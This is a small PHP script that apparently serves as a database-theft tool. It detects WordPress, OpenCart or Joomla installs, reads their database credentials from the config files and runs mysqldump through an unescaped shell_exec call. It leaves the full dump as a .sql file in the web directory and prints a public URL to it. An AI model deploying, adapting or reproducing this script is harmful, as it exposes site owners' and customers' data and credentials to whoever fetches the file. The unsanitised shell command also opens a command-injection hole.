<?php
set_time_limit (0);

//Check WORDPRESS
if (file_exists('wp-config.php')) {
    include('wp-config.php');
    echo "Detected: WP<br>";
    MakeDump (DB_HOST,DB_NAME,DB_USER,DB_PASSWORD);
}
//Check OPENCART
if (file_exists('config.php')) {
    include('config.php');
    echo "Detected: Opencart<br>";
    MakeDump (DB_HOSTNAME,DB_DATABASE,DB_USERNAME,DB_PASSWORD);    

}

//Check Joomla
if (file_exists('configuration.php')) {
    include('configuration.php');
    echo "Detected: Joomla<br>";
    $config=new JConfig;
    MakeDump ($config->host,$config->db,$config->user,$config->password);    

}


function MakeDump($dbhost,$dbname,$dbuser,$dbpassword)
{
    shell_exec('mysqldump -u'.$dbuser.' -h'.$dbhost.' -p'.$dbpassword.' '.$dbname.' > '.$dbname.'.sql');
    echo "Dump done, "; 
    if (isset($_SERVER['REQUEST_URI'])) {
    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    echo "Database file -> ".dirname($current_url)."/".$dbname.".sql";

    } else {
        echo "Database file -> $dbname.sql";
    }
    
}
